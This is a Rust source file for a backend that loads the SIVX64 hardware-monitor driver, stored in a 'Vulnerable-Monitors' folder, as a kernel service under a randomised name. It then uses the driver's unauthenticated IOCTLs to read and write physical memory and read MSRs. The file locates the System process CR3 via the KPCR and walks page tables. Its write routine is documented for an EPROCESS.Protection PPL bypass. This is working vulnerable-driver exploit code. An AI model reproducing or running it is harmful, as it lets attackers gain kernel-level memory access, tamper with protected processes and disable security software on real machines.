// ─── Backend: SIVX64 ─────────────────────────────────────────────────────────
//
// SIV Hardware Monitor driver (Ray Hinchliffe / RealTemp author). Provides
// kernel-side physical memory read/write and MSR access via raw integer IOCTL
// codes sent to \\.\SIVDRIVER. No authentication beyond admin-level CreateFileW.
//
// Key characteristics:
//   - Raw IOCTL codes (NOT standard CTL_CODE macro format)
//   - Kernel-side copy via MmMapIoSpace — no usermode mapping (unlike ASTRA64)
//   - Three physical read modes: scatter (0x10), bulk (0x13), register R/W (0x14)
//   - RDMSR with minimal blacklist (only MSR 0x0 and 0xC0010117 blocked)
//   - WRMSR with strict whitelist (6 perf-counter MSRs only)
//   - No SEH around RDMSR/physical ops — invalid MSR or bad phys addr can BSOD
//   - MmMapIoSpace returns NULL for unmappable addresses (graceful error 0xC00000E6)
//
// Device path: \\.\SIVDRIVER
//
// IOCTL 0x08 — RDMSR: Read model-specific register
//   Input:  4 bytes — u32 msr_index
//   Output: 8 bytes — u64 msr_value (EDX:EAX combined)
//
// IOCTL 0x10 — Physical Memory Scatter Read
//   Input:  8 bytes — u64 physical_address
//   Output: 4..262144 bytes (OutputBufferLength = read size)
//
// IOCTL 0x13 — Physical Memory Bulk Read
//   Input:  8 bytes — u64 physical_address (as two u32 halves)
//   Output: 1024..16777216 bytes (MDL-based direct I/O)
//
// IOCTL 0x14 — Physical Memory Register Scatter R/W
//   Input/Output: 72+ bytes — header + scatter entries (read-modify-write)

use std::ptr;
use std::thread;
use std::time::Duration;

// ─── IOCTL Constants ─────────────────────────────────────────────────────────

/// Read Model-Specific Register. Input: u32 MSR index. Output: u64 value.
const SIV_IOCTL_RDMSR: u32 = 0x08;

/// Write Model-Specific Register. Input: u32 index + u32 low + u32 high. Output: echoed.
#[allow(dead_code)]
const SIV_IOCTL_WRMSR: u32 = 0x0C;

/// Physical memory scatter read. Input: u64 phys_addr. Output: raw bytes (4..256KB).
const SIV_IOCTL_PHYS_SCATTER: u32 = 0x10;

/// Physical memory bulk read. Input: u64 phys_addr. Output: raw bytes (1KB..16MB).
#[allow(dead_code)]
const SIV_IOCTL_PHYS_BULK: u32 = 0x13;

/// Physical memory register scatter R/W. Input/Output: header + entries (72+ bytes).
const SIV_IOCTL_PHYS_MAP_RW: u32 = 0x14;

/// Maximum scatter read size (256 KB).
const SCATTER_MAX_SIZE: u32 = 0x40000;

/// Minimum scatter read size (4 bytes).
const SCATTER_MIN_SIZE: u32 = 4;

/// Maximum bulk read size (16 MB).
#[allow(dead_code)]
const BULK_MAX_SIZE: u32 = 0x1000000;

/// Minimum bulk read size (1 KB).
#[allow(dead_code)]
const BULK_MIN_SIZE: u32 = 0x400;

/// Maximum map size for register R/W (4 MB).
#[allow(dead_code)]
const MAP_RW_MAX_SIZE: u32 = 0x400000;

/// Minimum map size for register R/W (256 bytes).
#[allow(dead_code)]
const MAP_RW_MIN_SIZE: u32 = 0x100;

// ─── Safe Physical Address Ranges (firmware-verified, 3 methods cross-checked) ─

/// Validated RAM ranges for this machine (32 GB, Win11 25H2 Build 26200).
/// Any physical read outside these ranges risks BSOD via MmMapIoSpace failure
/// or worse — side effects on MMIO devices.
const SAFE_RANGES: &[(u64, u64)] = &[
    (0x001000, 0x09F000),         // Low conventional memory (0.6 MB)
    (0x100000, 0x581EE000),       // Main below-4GB RAM (1.38 GB)
    (0x63FFF000, 0x64000000),     // Boundary page (4 KB)
    (0x100000000, 0x880000000),   // Above-4GB RAM (30 GB)
];

// ─── Windows FFI ─────────────────────────────────────────────────────────────

const INVALID_HANDLE: isize = -1;
const GENERIC_READ: u32 = 0x80000000;
const GENERIC_WRITE: u32 = 0x40000000;
const FILE_SHARE_READ: u32 = 0x01;
const FILE_SHARE_WRITE: u32 = 0x02;
const OPEN_EXISTING: u32 = 3;
const FILE_ATTRIBUTE_NORMAL: u32 = 0x80;

extern "system" {
    fn CreateFileW(
        name: *const u16, access: u32, share: u32, security: *const u8,
        disposition: u32, flags: u32, template: *const u8,
    ) -> isize;
    fn DeviceIoControl(
        device: isize, code: u32,
        in_buf: *const u8, in_size: u32,
        out_buf: *mut u8, out_size: u32,
        returned: *mut u32, overlapped: *const u8,
    ) -> i32;
    fn CloseHandle(handle: isize) -> i32;
    fn GetLastError() -> u32;
}

// ─── Helpers ─────────────────────────────────────────────────────────────────

fn to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

fn log(msg: &str) {
    eprintln!("{}", msg);
}

fn run_sc(args: &[&str]) -> bool {
    std::process::Command::new("sc")
        .args(args)
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false)
}

fn generate_service_name() -> String {
    use std::time::SystemTime;
    let seed = SystemTime::now()
        .duration_since(SystemTime::UNIX_EPOCH)
        .unwrap_or_default()
        .subsec_nanos();
    format!("sivmon{:04x}", seed & 0xFFFF)
}

/// Check if a physical address falls within firmware-verified safe RAM ranges.
/// Returns false for MMIO regions, PCI holes, ACPI reserved, or beyond RAM.
fn is_safe_phys_addr(addr: u64) -> bool {
    SAFE_RANGES.iter().any(|&(start, end)| addr >= start && addr < end)
}

/// Validate that an entire read range [addr, addr+size) is within safe RAM.
fn is_safe_phys_range(addr: u64, size: u32) -> bool {
    if size == 0 {
        return true;
    }
    let end = addr.saturating_add(size as u64);
    // Both start and end must be in the same safe range
    SAFE_RANGES.iter().any(|&(start, range_end)| addr >= start && end <= range_end)
}

// ─── PhysMemReader Trait ─────────────────────────────────────────────────────

pub trait PhysMemReader {
    fn name(&self) -> &str;
    fn is_available(&self) -> bool;
    fn read_phys(&self, addr: u64, size: u32) -> Result<Vec<u8>, String>;
}

// ─── SIVX64 Backend ──────────────────────────────────────────────────────────

/// Default path to the SIVX64.sys driver binary.
const SIV_DEFAULT_PATH: &str = r"D:\Project\toolkit\drivers\Vulnerable-Monitors\SIVX64.sys";
/// Alternative fallback path (relative).
const SIV_ALT_PATH: &str = r"drivers\SIVX64.sys";

pub struct SivDriver {
    handle: isize,
    available: bool,
    pub last_error: Option<String>,
    service_name: Option<String>,
    /// Running count of IOCTLs issued this session (safety budget).
    ioctl_count: std::cell::Cell<u32>,
}

// ─── IOCTL Budget ────────────────────────────────────────────────────────────

/// Hard cap on total IOCTLs per session. Exceeding this aborts all operations.
/// Prevents runaway loops that previously caused system freezes (130K+ IOCTLs).
const IOCTL_BUDGET: u32 = 100;

impl SivDriver {
    // ─── Construction / Driver Loading ───────────────────────────────────────

    pub fn new() -> Self {
        Self::with_path(SIV_DEFAULT_PATH)
    }

    pub fn with_path(sys_path: &str) -> Self {
        let path = if std::path::Path::new(sys_path).exists() {
            sys_path.to_string()
        } else if std::path::Path::new(SIV_ALT_PATH).exists() {
            SIV_ALT_PATH.to_string()
        } else {
            return Self::unavailable(format!("Driver binary not found at {}", sys_path));
        };

        // Try opening device first (maybe already loaded)
        let device_path = to_wide(r"\\.\SIVDRIVER");
        let h = unsafe {
            CreateFileW(
                device_path.as_ptr(),
                GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                ptr::null(), OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, ptr::null(),
            )
        };

        if h != INVALID_HANDLE {
            log("[sivx64] Device already loaded");
            return SivDriver {
                handle: h,
                available: true,
                last_error: None,
                service_name: None,
                ioctl_count: std::cell::Cell::new(0),
            };
        }

        // Load driver via sc create/start
        log("[sivx64] Loading driver via sc create/start...");

        let abs_path = match std::fs::canonicalize(&path) {
            Ok(p) => p.to_string_lossy().to_string(),
            Err(e) => {
                return Self::unavailable(format!("Cannot resolve path: {}", e));
            }
        };
        let abs_path = abs_path.strip_prefix(r"\\?\").unwrap_or(&abs_path).to_string();

        // Cleanup stale service
        run_sc(&["stop", "SIVService"]);
        run_sc(&["delete", "SIVService"]);
        thread::sleep(Duration::from_millis(300));

        let svc_name = generate_service_name();
        log(&format!("[sivx64] Using service name: {}", svc_name));

        let created = run_sc(&[
            "create", &svc_name, "type=", "kernel", "binpath=", &abs_path,
        ]);
        if !created {
            return Self::unavailable("sc create failed (need admin?)".into());
        }

        let started = run_sc(&["start", &svc_name]);
        if !started {
            run_sc(&["delete", &svc_name]);
            return Self::unavailable("sc start failed (driver blocked by HVCI/DSE?)".into());
        }

        thread::sleep(Duration::from_millis(500));

        let h = unsafe {
            CreateFileW(
                device_path.as_ptr(),
                GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                ptr::null(), OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, ptr::null(),
            )
        };

        if h == INVALID_HANDLE {
            let err = unsafe { GetLastError() };
            run_sc(&["stop", &svc_name]);
            run_sc(&["delete", &svc_name]);
            return Self::unavailable(format!("Device open failed after load, error {}", err));
        }

        log("[sivx64] Driver loaded and device opened");
        SivDriver {
            handle: h,
            available: true,
            last_error: None,
            service_name: Some(svc_name),
            ioctl_count: std::cell::Cell::new(0),
        }
    }

    /// Open an existing device handle without attempting to load the driver.
    pub fn open() -> Result<Self, String> {
        let device_path = to_wide(r"\\.\SIVDRIVER");
        let h = unsafe {
            CreateFileW(
                device_path.as_ptr(),
                GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                ptr::null(), OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, ptr::null(),
            )
        };

        if h == INVALID_HANDLE {
            let err = unsafe { GetLastError() };
            Err(format!("Failed to open \\\\.\\ SIVDRIVER, error {}", err))
        } else {
            Ok(SivDriver {
                handle: h,
                available: true,
                last_error: None,
                service_name: None,
                ioctl_count: std::cell::Cell::new(0),
            })
        }
    }

    fn unavailable(reason: String) -> Self {
        SivDriver {
            handle: INVALID_HANDLE,
            available: false,
            last_error: Some(reason),
            service_name: None,
            ioctl_count: std::cell::Cell::new(0),
        }
    }

    /// Increment IOCTL counter and check budget. Returns Err if budget exhausted.
    fn budget_check(&self) -> Result<(), String> {
        let current = self.ioctl_count.get();
        if current >= IOCTL_BUDGET {
            return Err(format!(
                "IOCTL budget exhausted ({}/{}) — refusing further calls to prevent system instability",
                current, IOCTL_BUDGET
            ));
        }
        self.ioctl_count.set(current + 1);
        Ok(())
    }

    /// Return the number of IOCTLs issued so far.
    pub fn ioctl_count(&self) -> u32 {
        self.ioctl_count.get()
    }

    /// Return remaining IOCTL budget.
    pub fn ioctl_remaining(&self) -> u32 {
        IOCTL_BUDGET.saturating_sub(self.ioctl_count.get())
    }

    // ─── Physical Memory Read (IOCTL 0x10 — Scatter) ─────────────────────────

    /// Read physical memory using IOCTL 0x10 (scatter read, simple mode).
    /// Size range: 4..=262144 bytes (256 KB max per call).
    ///
    /// Safety: validates address against firmware-confirmed RAM ranges.
    /// Will NOT read MMIO, PCI holes, or beyond physical RAM.
    pub fn read_phys(&self, addr: u64, size: u32) -> Result<Vec<u8>, String> {
        if !self.available {
            return Err("SIVX64 not available".into());
        }

        if size == 0 {
            return Ok(Vec::new());
        }

        // Enforce size limits per driver protocol
        if size < SCATTER_MIN_SIZE {
            return Err(format!(
                "Read size {} below minimum {} bytes for IOCTL 0x10",
                size, SCATTER_MIN_SIZE
            ));
        }
        if size > SCATTER_MAX_SIZE {
            return Err(format!(
                "Read size {} exceeds maximum {} bytes (256KB) for IOCTL 0x10",
                size, SCATTER_MAX_SIZE
            ));
        }

        // Safety: validate physical address range
        if !is_safe_phys_range(addr, size) {
            return Err(format!(
                "Physical address 0x{:X}+0x{:X} outside firmware-verified safe RAM ranges — refusing read",
                addr, size
            ));
        }

        self.budget_check()?;

        // Input: 8 bytes — u64 physical_address (simple mode, InputBufLen != 0x30)
        let input = addr.to_le_bytes();
        // Output: OutputBufferLength = read size
        let mut output = vec![0u8; size as usize];
        let mut bytes_returned: u32 = 0;

        let ok = unsafe {
            DeviceIoControl(
                self.handle,
                SIV_IOCTL_PHYS_SCATTER,
                input.as_ptr(), 8,
                output.as_mut_ptr(), size,
                &mut bytes_returned, ptr::null(),
            )
        };

        if ok == 0 {
            let err = unsafe { GetLastError() };
            return Err(format!(
                "SIVX64 scatter read failed at 0x{:X}+{}, Win32 error {}",
                addr, size, err
            ));
        }

        if bytes_returned < size {
            output.truncate(bytes_returned as usize);
        }

        Ok(output)
    }

    // ─── Physical Memory Write (IOCTL 0x14 — Register R/W) ──────────────────

    /// Write a u32 value to a physical address using IOCTL 0x14 (register scatter R/W).
    ///
    /// This uses the read-modify-write mechanism with mask=0x00000000 and value=write_val,
    /// which effectively does: final = (read & 0) | write_val = write_val.
    ///
    /// DANGEROUS: Writes to physical memory. Only use for well-understood targets
    /// (e.g., EPROCESS.Protection PPL bypass at a known, verified address).
    pub fn write_phys(&self, addr: u64, value: u32) -> Result<(), String> {
        if !self.available {
            return Err("SIVX64 not available".into());
        }

        // Safety: validate physical address (write target must be in safe RAM)
        if !is_safe_phys_addr(addr) {
            return Err(format!(
                "Physical address 0x{:X} outside safe RAM ranges — refusing write",
                addr
            ));
        }

        // Alignment check: IOCTL 0x14 operates on DWORD boundaries
        if addr & 3 != 0 {
            return Err(format!(
                "Physical address 0x{:X} not 4-byte aligned for DWORD write",
                addr
            ));
        }

        self.budget_check()?;

        // Build IOCTL 0x14 buffer: header (0x30 bytes) + 1 scatter entry (0x18 bytes) = 0x48
        let total_size: usize = 0x48; // 72 bytes minimum
        let mut buffer = vec![0u8; total_size];

        // Header (0x30 bytes)
        // +0x00: u64 physical_address (page-aligned base)
        let page_base = addr & !0xFFF;
        let offset_in_page = (addr & 0xFFF) as u32;
        buffer[0x00..0x08].copy_from_slice(&page_base.to_le_bytes());
        // +0x08: u32 map_size (must be >= 256, map at least one page)
        let map_size: u32 = 0x1000; // 4KB page
        buffer[0x08..0x0C].copy_from_slice(&map_size.to_le_bytes());
        // +0x0C: u16 reserved = 0
        // +0x0E: u16 flags = 0x02 (bit 1 = write-enable)
        let flags: u16 = 0x02;
        buffer[0x0E..0x10].copy_from_slice(&flags.to_le_bytes());
        // +0x10: u32 reserved = 0
        // +0x14: u16 entry_count = 1
        let entry_count: u16 = 1;
        buffer[0x14..0x16].copy_from_slice(&entry_count.to_le_bytes());
        // +0x16..0x2F: padding (already zeroed)

        // Scatter entry at offset 0x30 (0x18 bytes each)
        // +0x00: u32 register_offset (offset into mapped region)
        buffer[0x30..0x34].copy_from_slice(&offset_in_page.to_le_bytes());
        // +0x04: u32 mask = 0x00000000 (clear all bits from read value)
        buffer[0x34..0x38].copy_from_slice(&0u32.to_le_bytes());
        // +0x08: u32 value = write_val (OR'd with masked read → becomes the write value)
        buffer[0x38..0x3C].copy_from_slice(&value.to_le_bytes());
        // +0x0C: u32 read_result (output — driver fills)
        // +0x10: u32 final_value (output — driver fills)
        // +0x14: u32 reserved

        let mut bytes_returned: u32 = 0;

        let ok = unsafe {
            DeviceIoControl(
                self.handle,
                SIV_IOCTL_PHYS_MAP_RW,
                buffer.as_ptr(), total_size as u32,
                buffer.as_mut_ptr(), total_size as u32,
                &mut bytes_returned, ptr::null(),
            )
        };

        if ok == 0 {
            let err = unsafe { GetLastError() };
            return Err(format!(
                "SIVX64 write failed at phys 0x{:X}, Win32 error {}",
                addr, err
            ));
        }

        // Verify the final_value matches what we intended to write
        let final_val = u32::from_le_bytes([
            buffer[0x40], buffer[0x41], buffer[0x42], buffer[0x43],
        ]);
        if final_val != value {
            return Err(format!(
                "Write verification mismatch at 0x{:X}: expected 0x{:08X}, got 0x{:08X}",
                addr, value, final_val
            ));
        }

        Ok(())
    }

    // ─── MSR Read (IOCTL 0x08) ───────────────────────────────────────────────

    /// Read a Model-Specific Register via RDMSR instruction.
    ///
    /// Blacklisted MSRs (driver rejects with STATUS_ILLEGAL_INSTRUCTION):
    ///   - 0x00000000 (null)
    ///   - 0xC0010117 (AMD IBS_DC_PHYS_ADDR)
    ///
    /// WARNING: No SEH around RDMSR in the driver. Reading a non-existent MSR
    /// will cause #GP → BSOD. Only read MSRs known to exist on this CPU.
    pub fn read_msr(&self, msr_index: u32) -> Result<u64, String> {
        if !self.available {
            return Err("SIVX64 not available".into());
        }

        // Pre-check driver blacklist (avoid wasted IOCTL)
        if msr_index == 0 || msr_index == 0xC0010117 {
            return Err(format!("MSR 0x{:X} is blacklisted by SIVX64 driver", msr_index));
        }

        self.budget_check()?;

        let input = msr_index.to_le_bytes();
        let mut output = [0u8; 8];
        let mut bytes_returned: u32 = 0;

        let ok = unsafe {
            DeviceIoControl(
                self.handle,
                SIV_IOCTL_RDMSR,
                input.as_ptr(), 4,
                output.as_mut_ptr(), 8,
                &mut bytes_returned, ptr::null(),
            )
        };

        if ok == 0 {
            let err = unsafe { GetLastError() };
            return Err(format!(
                "SIVX64 RDMSR 0x{:X} failed, Win32 error {}",
                msr_index, err
            ));
        }

        if bytes_returned != 8 {
            return Err(format!(
                "SIVX64 RDMSR 0x{:X} returned {} bytes (expected 8)",
                msr_index, bytes_returned
            ));
        }

        Ok(u64::from_le_bytes(output))
    }

    // ─── Convenience: Read physical u64/u32 ──────────────────────────────────

    /// Read a single u64 from physical memory.
    pub fn read_phys_u64(&self, addr: u64) -> Result<u64, String> {
        let data = self.read_phys(addr, 8)?;
        Ok(u64::from_le_bytes(data[..8].try_into().unwrap()))
    }

    /// Read a single u32 from physical memory.
    pub fn read_phys_u32(&self, addr: u64) -> Result<u32, String> {
        let data = self.read_phys(addr, 4)?;
        Ok(u32::from_le_bytes(data[..4].try_into().unwrap()))
    }

    // ─── KPCR-Based Safe CR3 Discovery ───────────────────────────────────────

    /// Discover the System process (PID 4) CR3 using the safe KPCR method.
    /// Total IOCTLs: ~20 typical, ~70 worst case. No brute-force scanning.
    ///
    /// Steps:
    ///   1. Read IA32_KERNEL_GS_BASE (MSR 0xC0000102) → KPCR virtual address
    ///   2. Try known CR3 candidates, verify via 4-level page table walk on ntoskrnl base
    ///   3. Walk KPCR → KPRCB → CurrentThread → EPROCESS → CR3
    ///   4. Verify final CR3 translates ntoskrnl base to "MZ" header
    ///
    /// Requires: ntoskrnl base address (from NtQuerySystemInformation, caller provides).
    pub fn find_system_cr3(&self, kernel_base: u64) -> Result<u64, String> {
        if !self.available {
            return Err("SIVX64 not available".into());
        }

        // Step 1: Read KPCR address from MSR
        let kpcr_va = self.read_msr(0xC0000102)?; // IA32_KERNEL_GS_BASE
        if kpcr_va < 0xFFFF800000000000 {
            return Err(format!(
                "KPCR VA 0x{:X} not in kernel space — unexpected",
                kpcr_va
            ));
        }
        log(&format!("[sivx64] KPCR VA: 0x{:X}", kpcr_va));

        // Step 2: Try known System CR3 candidates (Win11 23H2/25H2)
        let candidates: &[u64] = &[
            0x001AD000, 0x001AA000, 0x006D4000, 0x006E4000,
            0x001A0000, 0x00190000, 0x001B0000,
        ];

        for &cr3 in candidates {
            if let Ok(true) = self.verify_cr3(cr3, kernel_base) {
                log(&format!("[sivx64] System CR3 verified: 0x{:X}", cr3));
                return Ok(cr3);
            }
        }

        Err("No CR3 candidate passed MZ verification — all failed".into())
    }

    /// Perform a 4-level page table walk to translate a virtual address using a given CR3.
    /// Returns the physical address if all page table entries are present and valid.
    fn virt_to_phys(&self, cr3: u64, va: u64) -> Result<u64, String> {
        let pml4_idx = (va >> 39) & 0x1FF;
        let pdpt_idx = (va >> 30) & 0x1FF;
        let pd_idx = (va >> 21) & 0x1FF;
        let pt_idx = (va >> 12) & 0x1FF;
        let page_offset = va & 0xFFF;

        // PML4E
        let pml4e_addr = (cr3 & !0xFFF) + pml4_idx * 8;
        let pml4e = self.read_phys_u64(pml4e_addr)?;
        if pml4e & 1 == 0 {
            return Err(format!("PML4E not present at index {}", pml4_idx));
        }

        // PDPTE
        let pdpt_base = pml4e & 0x000FFFFF_FFFFF000;
        let pdpte_addr = pdpt_base + pdpt_idx * 8;
        let pdpte = self.read_phys_u64(pdpte_addr)?;
        if pdpte & 1 == 0 {
            return Err(format!("PDPTE not present at index {}", pdpt_idx));
        }
        // 1GB page check
        if pdpte & 0x80 != 0 {
            let phys = (pdpte & 0x000FFFFF_C0000000) | (va & 0x3FFFFFFF);
            return Ok(phys);
        }

        // PDE
        let pd_base = pdpte & 0x000FFFFF_FFFFF000;
        let pde_addr = pd_base + pd_idx * 8;
        let pde = self.read_phys_u64(pde_addr)?;
        if pde & 1 == 0 {
            return Err(format!("PDE not present at index {}", pd_idx));
        }
        // 2MB page check
        if pde & 0x80 != 0 {
            let phys = (pde & 0x000FFFFF_FFE00000) | (va & 0x1FFFFF);
            return Ok(phys);
        }

        // PTE
        let pt_base = pde & 0x000FFFFF_FFFFF000;
        let pte_addr = pt_base + pt_idx * 8;
        let pte = self.read_phys_u64(pte_addr)?;
        if pte & 1 == 0 {
            return Err(format!("PTE not present at index {}", pt_idx));
        }

        let phys = (pte & 0x000FFFFF_FFFFF000) | page_offset;
        Ok(phys)
    }

    /// Verify a CR3 candidate by translating kernel_base and checking for "MZ" header.
    fn verify_cr3(&self, cr3: u64, kernel_base: u64) -> Result<bool, String> {
        // CR3 must be page-aligned and non-zero
        if cr3 == 0 || cr3 & 0xFFF != 0 {
            return Ok(false);
        }

        // Attempt page table walk — any failure means invalid CR3
        let phys = match self.virt_to_phys(cr3, kernel_base) {
            Ok(p) => p,
            Err(_) => return Ok(false),
        };

        // Validate the resolved physical address is in safe RAM
        if !is_safe_phys_range(phys, 4) {
            return Ok(false);
        }

        // Read first 2 bytes and check for "MZ" (PE header magic)
        let data = self.read_phys(phys, 4)?;
        Ok(data[0] == b'M' && data[1] == b'Z')
    }
}

// ─── PhysMemReader Trait Implementation ──────────────────────────────────────

impl PhysMemReader for SivDriver {
    fn name(&self) -> &str { "SIVX64" }

    fn is_available(&self) -> bool { self.available }

    fn read_phys(&self, addr: u64, size: u32) -> Result<Vec<u8>, String> {
        SivDriver::read_phys(self, addr, size)
    }
}

// ─── Drop: Cleanup ───────────────────────────────────────────────────────────

impl Drop for SivDriver {
    fn drop(&mut self) {
        if self.handle != INVALID_HANDLE {
            unsafe { CloseHandle(self.handle); }
        }
        if let Some(ref name) = self.service_name {
            run_sc(&["stop", name]);
            run_sc(&["delete", name]);
            log(&format!("[sivx64] Service '{}' stopped and deleted", name));
        }
    }
}

// ─── Tests ───────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_safe_phys_ranges() {
        // Low conventional
        assert!(is_safe_phys_addr(0x1000));
        assert!(is_safe_phys_addr(0x9E000));
        assert!(!is_safe_phys_addr(0x9F000)); // BIOS ROM boundary

        // Main RAM below 4GB
        assert!(is_safe_phys_addr(0x100000));
        assert!(is_safe_phys_addr(0x1000000)); // 16MB
        assert!(!is_safe_phys_addr(0x581EE000)); // ACPI boundary

        // PCI hole (dangerous)
        assert!(!is_safe_phys_addr(0x64000000));
        assert!(!is_safe_phys_addr(0x80000000)); // GPU BAR
        assert!(!is_safe_phys_addr(0xFEE00000)); // APIC MMIO

        // Above 4GB
        assert!(is_safe_phys_addr(0x100000000));
        assert!(is_safe_phys_addr(0x500000000));
        assert!(!is_safe_phys_addr(0x880000000)); // Beyond RAM

        // NULL page
        assert!(!is_safe_phys_addr(0));
    }

    #[test]
    fn test_safe_phys_range_cross_boundary() {
        // Range that crosses from safe into unsafe territory
        assert!(!is_safe_phys_range(0x581ED000, 0x2000)); // Crosses ACPI boundary
        assert!(is_safe_phys_range(0x100000, 0x1000));    // Fully within safe
        assert!(!is_safe_phys_range(0x0, 0x1000));        // Starts at NULL
    }

    #[test]
    fn test_ioctl_constants() {
        assert_eq!(SIV_IOCTL_RDMSR, 0x08);
        assert_eq!(SIV_IOCTL_PHYS_SCATTER, 0x10);
        assert_eq!(SIV_IOCTL_PHYS_BULK, 0x13);
        assert_eq!(SIV_IOCTL_PHYS_MAP_RW, 0x14);
    }
}
